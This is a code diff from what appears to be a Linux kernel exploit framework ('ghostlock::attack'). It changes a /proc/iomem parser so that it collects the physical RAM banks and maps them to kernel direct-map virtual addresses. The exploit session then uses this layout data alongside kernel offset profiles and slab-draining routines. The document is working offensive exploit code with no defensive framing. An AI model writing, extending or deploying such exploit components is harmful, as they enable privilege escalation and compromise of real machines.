@@ -107,11 +107,14 @@ namespace ghostlock::attack {
 
     /* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
      * A nested bank lies inside its parent, so it cannot widen either bound. */
-    static int32_t iomem_map_span(FILE *f, uint64_t *map_span) {
+    static int32_t iomem_map_span(FILE *f, uint64_t *map_span,
+                                  kernel::direct_map_bank *banks, size_t *bank_count) {
         unsigned long long base = 0, top = 0;
         char *line = nullptr;
         size_t cap = 0;
         int32_t found = 0;
+        size_t count = 0;
+        kernel::direct_map_bank physical[kernel::MAX_DIRECT_MAP_BANKS]{};
 
         while (getline(&line, &cap, f) > 0) {
             size_t len = strlen(line);
@@ -130,6 +133,11 @@ namespace ghostlock::attack {
                     found = 1;
                 }
                 if (b + 1 > top) top = b + 1;
+                if (count < kernel::MAX_DIRECT_MAP_BANKS) {
+                    physical[count].start = a;
+                    physical[count].end = b + 1;
+                    ++count;
+                }
             }
         }
         /* Kept as the C getline/free pair: the ScopeExit experiment grew
@@ -141,6 +149,13 @@ namespace ghostlock::attack {
         base &= ~((1ULL << 30) - 1);
         if (!found || top <= base) return 0;
         *map_span = top - base;
+        /* Convert the physical banks to direct-map VAs while `base` is known;
+         * the caller validates the span before publishing them. */
+        for (size_t i = 0; i < count; ++i) {
+            banks[i].start = kernel::DIRECT_MAP_BASE + (physical[i].start - base);
+            banks[i].end = kernel::DIRECT_MAP_BASE + (physical[i].end - base);
+        }
+        *bank_count = count;
         return 1;
     }
 
@@ -151,6 +166,8 @@ namespace ghostlock::attack {
         std::array < char, 192 > stamp{};
         uint64_t span = 0;
         int32_t ok = 0;
+        kernel::direct_map_bank banks[kernel::MAX_DIRECT_MAP_BANKS]{};
+        size_t bank_count = 0;
         const profile::kernel_offsets *values =
                 session::g_exploit_session.profile.values();
         const char *release = values && values->uname_r ? values->uname_r : "";
@@ -167,7 +184,7 @@ namespace ghostlock::attack {
                 const std::string_view stamp_view(stamp.data());
                 ok = stamp_view.starts_with("# ") &&
                      stamp_view.substr(2) == release &&
-                     iomem_map_span(f, &span);
+                     iomem_map_span(f, &span, banks, &bank_count);
             }
         }
 
@@ -182,13 +199,22 @@ namespace ghostlock::attack {
                             : 0;
         if (!ok || !dram || span < (1ULL << 30) || span < dram ||
             span >= kernel::DIRECT_MAP_END - kernel::DIRECT_MAP_BASE) {
+            kernel::g_direct_map_bank_count = 0;
             pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
             return;
         }
 
         kernel::g_direct_map_end = kernel::DIRECT_MAP_BASE + span;
-        pr_info("iomem cache: direct_map_end=%016llx\n",
-                (unsigned long long) kernel::g_direct_map_end);
+        kernel::g_direct_map_bank_count = 0;
+        for (size_t i = 0; i < bank_count && i < kernel::MAX_DIRECT_MAP_BANKS; ++i) {
+            const uint64_t start = banks[i].start;
+            const uint64_t end = std::min<uint64_t>(banks[i].end, kernel::g_direct_map_end);
+            if (start < end)
+                kernel::g_direct_map_banks[kernel::g_direct_map_bank_count++] = {start, end};
+        }
+        pr_info("iomem cache: direct_map_end=%016llx banks=%zu\n",
+                (unsigned long long) kernel::g_direct_map_end,
+                kernel::g_direct_map_bank_count);
     }
 
     void slab_drain(void) {
